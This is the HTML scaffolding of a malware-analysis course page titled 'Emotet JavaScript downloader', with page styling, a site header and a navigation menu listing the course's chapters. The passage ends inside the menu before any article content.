<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<title>Emotet JavaScript downloader &#8211; Max Kersten</title>
<style type="text/css">
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for javascript
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.javascript .de1, .javascript .de2 {}
.javascript  {font-family:monospace;}
.javascript .imp {font-weight: bold; color: red;}
.javascript li, .javascript .li1 {font-weight: normal; vertical-align:top;}
.javascript .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.javascript .li2 {font-weight: bold; vertical-align:top;}
.javascript .kw1 {color: #000066; font-weight: bold;}
.javascript .kw2 {color: #003366; font-weight: bold;}
.javascript .kw3 {color: #000066;}
.javascript .kw5 {color: #FF0000;}
.javascript .co1 {color: #006600; font-style: italic;}
.javascript .co2 {color: #009966; font-style: italic;}
.javascript .coMULTI {color: #006600; font-style: italic;}
.javascript .es0 {color: #000099; font-weight: bold;}
.javascript .br0 {color: #009900;}
.javascript .sy0 {color: #339933;}
.javascript .st0 {color: #3366CC;}
.javascript .nu0 {color: #CC0000;}
.javascript .me1 {color: #660066;}
.javascript .ln-xtra, .javascript li.ln-xtra, .javascript div.ln-xtra {background-color: #ffc;}
.javascript span.xtra { display:block; }
</style>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="Max Kersten &raquo; Feed" href="https://maxkersten.nl/feed/" />
<link rel="alternate" type="application/rss+xml" title="Max Kersten &raquo; Comments Feed" href="https://maxkersten.nl/comments/feed/" />

<link rel='stylesheet' id='wp-block-library-css' href='https://maxkersten.nl/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='generate-style-grid-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/unsemantic-grid.min.css?ver=1.3.46' type='text/css' media='all' />
<link rel='stylesheet' id='generate-style-css' href='https://maxkersten.nl/wp-content/themes/generatepress/style.css?ver=1.3.46' type='text/css' media='all' />
<style id='generate-style-inline-css' type='text/css'>
body{background-color:#efefef;color:#3a3a3a;}a, a:visited{color:#1e73be;text-decoration:none;}a:hover, a:focus, a:active{color:#000000;text-decoration:none;}body .grid-container{max-width:1100px;}
body, button, input, select, textarea{font-family:"Open Sans", sans-serif;}.main-navigation .main-nav ul ul li a{font-size:14px;}@media (max-width:768px){.main-title{font-size:30px;}h1{font-size:30px;}h2{font-size:25px;}}
.site-header{background-color:#ffffff;color:#3a3a3a;}.site-header a,.site-header a:visited{color:#3a3a3a;}.main-title a,.main-title a:hover,.main-title a:visited{color:#222222;}.site-description{color:#999999;}.main-navigation,.main-navigation ul ul{background-color:#222222;}.main-navigation .main-nav ul li a,.menu-toggle{color:#ffffff;}.main-navigation .main-nav ul li > a:hover,.main-navigation .main-nav ul li > a:focus, .main-navigation .main-nav ul li.sfHover > a{color:#ffffff;background-color:#3f3f3f;}button.menu-toggle:hover,button.menu-toggle:focus,.main-navigation .mobile-bar-items a,.main-navigation .mobile-bar-items a:hover,.main-navigation .mobile-bar-items a:focus{color:#ffffff;}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation .main-nav ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation ul ul{background-color:#3f3f3f;}.main-navigation .main-nav ul ul li a{color:#ffffff;}.main-navigation .main-nav ul ul li > a:hover,.main-navigation .main-nav ul ul li > a:focus,.main-navigation .main-nav ul ul li.sfHover > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#4f4f4f;}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:#ffffff;}.entry-meta{color:#888888;}.entry-meta a,.entry-meta a:visited{color:#666666;}.entry-meta a:hover{color:#1e73be;}.sidebar .widget{background-color:#ffffff;}.sidebar .widget .widget-title{color:#000000;}.site-info{color:#ffffff;background-color:#222222;}.site-info a,.site-info a:visited{color:#ffffff;}.site-info a:hover{color:#606060;}.footer-bar .widget_nav_menu .current-menu-item a{color:#606060;}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],textarea{color:#666666;background-color:#fafafa;border-color:#cccccc;}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,textarea:focus{color:#666666;background-color:#ffffff;border-color:#bfbfbf;}button,html input[type="button"],input[type="reset"],input[type="submit"],.button,.button:visited{color:#ffffff;background-color:#666666;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,.button:focus{color:#ffffff;background-color:#3f3f3f;}
@media (max-width:768px){.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content, .inside-page-header{padding:30px;}}.main-navigation ul ul{top:auto;}
</style>
<link rel='stylesheet' id='generate-mobile-style-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/mobile.min.css?ver=1.3.46' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/font-awesome.min.css?ver=4.7' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='generate-ie-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/ie.min.css?ver=1.3.46' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='wpgeshi-wp-geshi-highlight-css' href='https://maxkersten.nl/wp-content/plugins/wp-geshi-highlight/wp-geshi-highlight.css?ver=6.7.1' type='text/css' media='all' />
<script type="text/javascript" src="https://maxkersten.nl/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://maxkersten.nl/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://maxkersten.nl/wp-json/wp/v2/pages/2472" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://maxkersten.nl/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-javascript-downloader/" />
<link rel='shortlink' href='https://maxkersten.nl/?p=2472' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://maxkersten.nl/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmaxkersten.nl%2Fbinary-analysis-course%2Fmalware-analysis%2Femotet-javascript-downloader%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://maxkersten.nl/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmaxkersten.nl%2Fbinary-analysis-course%2Fmalware-analysis%2Femotet-javascript-downloader%2F&#038;format=xml" />
<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-32x32.png" sizes="32x32" />
<link rel="icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-180x180.png" />
<meta name="msapplication-TileImage" content="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-270x270.png" />
</head>

<body data-rsssl=1 itemtype='http://schema.org/WebPage' itemscope='itemscope' class="page-template-default page page-id-2472 page-child parent-pageid-744  right-sidebar nav-below-header fluid-header separate-containers active-footer-widgets-0 nav-aligned-left header-aligned-left dropdown-hover">
	<a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>
			<header itemtype="http://schema.org/WPHeader" itemscope="itemscope" id="masthead" class="site-header">
		<div class="inside-header grid-container grid-parent">
						<div class="site-branding">
				<p class="main-title" itemprop="headline">
			<a href="https://maxkersten.nl/" rel="home">
				Max Kersten
			</a>
		</p>
				<p class="site-description">
			Security through explanation
		</p>
			</div>					</div><!-- .inside-header -->
	</header><!-- #masthead -->
			<nav itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope" id="site-navigation" class="main-navigation">
		<div class="inside-navigation grid-container grid-parent">
						<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
								<span class="mobile-menu">Menu</span>
			</button>
				<div id="primary-menu" class="main-nav">
		<ul class="menu sf-menu">
			<li class="page_item page-item-31"><a href="https://maxkersten.nl/">Home</a></li>
<li class="page_item page-item-51"><a href="https://maxkersten.nl/blog/">Blog</a></li>
<li class="page_item page-item-205 menu-item-has-children current-menu-ancestor"><a href="https://maxkersten.nl/binary-analysis-course/">Binary Analysis Course<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-240 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/introduction/">Introduction<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-208"><a href="https://maxkersten.nl/binary-analysis-course/introduction/secura-grand-slam-ctf-easy-reverse/">Practical case: Secura Grand Slam CTF &#8220;Easy Reverse&#8221;</a></li>
<li class="page_item page-item-2135"><a href="https://maxkersten.nl/binary-analysis-course/introduction/the-workstation/">The workstation</a></li>
<li class="page_item page-item-263"><a href="https://maxkersten.nl/binary-analysis-course/introduction/basic-cpu-architecture/">Basic CPU architecture</a></li>
	</ul>
</li>
<li class="page_item page-item-311 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/">Assembly basics<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-313"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/conditions-and-loops/">Conditions and loops</a></li>
<li class="page_item page-item-400"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-patch-me-0x01/">Practical case: Patch Me 0x01</a></li>
<li class="page_item page-item-485"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/methods-and-macros-the-call-stack/">Methods and macros: the call stack</a></li>
<li class="page_item page-item-529"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-buffer-overflow-0x01/">Practical case: Buffer Overflow 0x01</a></li>
<li class="page_item page-item-568"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/crash-course/">Crash course</a></li>
<li class="page_item page-item-1569"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x01/">Practical case: Crack Me 0x01</a></li>
<li class="page_item page-item-1680"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x02/">Practical case: Crack Me 0x02</a></li>
<li class="page_item page-item-1971"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x03/">Practical case: Crack Me 0x03</a></li>
	</ul>
</li>
<li class="page_item page-item-1286 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/">Assembly code<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1289"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/hello-world/">Hello world</a></li>
<li class="page_item page-item-1323"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/universal-product-code-calculator/">Universal Product Code calculator</a></li>
<li class="page_item page-item-1385"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/debugging-code/">Debugging code</a></li>
	</ul>
</li>
<li class="page_item page-item-610 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/">Binary types<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-615"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/dot-net/">Dot Net</a></li>
<li class="page_item page-item-687"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/android/">Android</a></li>
<li class="page_item page-item-1541"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/browser-plug-in/">Browser plug-in</a></li>
	</ul>
</li>
<li class="page_item page-item-1435 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/">Common techniques<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1441"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/general-techniques/">General techniques</a></li>
<li class="page_item page-item-3155"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/analysing-scripts/">Analysing scripts</a></li>
<li class="page_item page-item-3439"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/debugging-dot-net-binaries/">Debugging Dot Net binaries</a></li>
	</ul>
</li>
<li class="page_item page-item-744 menu-item-has-children current-menu-ancestor current-menu-parent"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/">Malware analysis<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-4305"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/dot-net-rat/">Dot Net RAT</a></li>
<li class="page_item page-item-862"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/android-sms-stealer/">Android SMS Stealer</a></li>
<li class="page_item page-item-1039"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/lnk-isesteroids-powershell-dropper/">LNK &#038; ISESteroids Powershell dropper</a></li>
<li class="page_item page-item-1079"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/">Emotet droppers</a></li>
<li class="page_item page-item-1193"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/magecart/">Magecart</a></li>
<li class="page_item page-item-1785"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-ddos-bot/">Corona DDoS bot</a></li>
<li class="page_item page-item-2326"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/azorult-loader-stages/">Azorult loader stages</a></li>
<li class="page_item page-item-2472 current-menu-item"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-javascript-downloader/">Emotet JavaScript downloader</a></li>
<li class="page_item page-item-2560"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-locker/">Corona Locker</a></li>
<li class="page_item page-item-3016"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/rezer0v4-loader/">ReZer0v4 loader</a></li>
<li class="page_item page-item-3913"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/dumping-whispergates-wiper-from-an-eazfuscator-obfuscated-loader/">Dumping WhisperGate&#8217;s wiper from an Eazfuscator obfuscated loader</a></li>
	</ul>
</li>
<li class="page_item page-item-2046 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/">Analysis scripts<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1007"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/automatic-string-formatting-deobfuscation/">PowerShell string formatting deobfuscation</a></li>
<li class="page_item page-item-2764"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/javascript-string-concatenation-deobfuscation/">JavaScript string concatenation deobfuscation</a></li>
<li class="page_item page-item-3061"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/automatic-rezer0-payload-and-configuration-extraction/">Automatic ReZer0 payload and configuration extraction</a></li>
<li class="page_item page-item-3206"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-decrypt-strings-in-amadey-1-09/">Ghidra script to decrypt strings in Amadey 1.09</a></li>
<li class="page_item page-item-3521"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-decrypt-a-string-array-in-xor-ddos/">Ghidra script to decrypt a string array in XOR DDoS</a></li>
<li class="page_item page-item-3974"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-handle-stack-strings/">Ghidra script to handle stack strings</a></li>
	</ul>
</li>
<li class="page_item page-item-3978 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/">Malware snippets<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3982"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/self-deletion/">Self Deletion</a></li>
<li class="page_item page-item-3984"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/api-hashing/">API Hashing</a></li>
	</ul>
</li>
<li class="page_item page-item-1250 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/obtaining-samples/">Obtaining samples<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1253"><a href="https://maxkersten.nl/binary-analysis-course/obtaining-samples/searching-samples/">Searching samples</a></li>
	</ul>
</li>
<li class="page_item page-item-2096 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/documentation/">Documentation<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-2099"><a href="https://maxkersten.nl/binary-analysis-course/documentation/article-structure/">Article structure</a></li>
	</ul>
</li>
<li class="page_item page-item-480"><a href="https://maxkersten.nl/binary-analysis-course/resources/">Resources</a></li>
<li class="page_item page-item-473"><a href="https://maxkersten.nl/binary-analysis-course/faq/">FAQ</a></li>
<li class="page_item page-item-1490 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/">Miscellaneous<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1493"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2018-2019/">A year in review: 2018-2019</a></li>
<li class="page_item page-item-2697"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2019-2020/">A year in review: 2019-2020</a></li>
<li class="page_item page-item-3467"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2020-2021/">A year in review: 2020-2021</a></li>
<li class="page_item page-item-4031"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2021-2022/">A year in review: 2021-2022</a></li>
	</ul>
</li>
</ul>
</li>
<li class="page_item page-item-4353"><a href="https://maxkersten.nl/libras-ghidra-library/">Libra&#8217;s Ghidra Library</a></li>
<li class="page_item page-item-161 menu-item-has-children"><a href="https://maxkersten.nl/projects/">Projects<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-793"><a href="https://maxkersten.nl/projects/androidprojectcreator/">AndroidProjectCreator</a></li>
<li class="page_item page-item-3295 menu-item-has-children"><a href="https://maxkersten.nl/projects/m3-framework/">m3 framework<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3292"><a href="https://maxkersten.nl/projects/m3-framework/extending-m3/">Extending m3</a></li>
<li class="page_item page-item-3329"><a href="https://maxkersten.nl/projects/m3-framework/anubis-and-cerberus-explained/">Anubis and Cerberus explained</a></li>
	</ul>
</li>
<li class="page_item page-item-3128 menu-item-has-children"><a href="https://maxkersten.nl/projects/api-client-libraries/">API client libraries<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3351"><a href="https://maxkersten.nl/projects/api-client-libraries/hatching-triage-java-api-client/">Hatching Triage Java API client</a></li>
<li class="page_item page-item-3353"><a href="https://maxkersten.nl/projects/api-client-libraries/malshare-java-api-client/">MalShare Java API client</a></li>
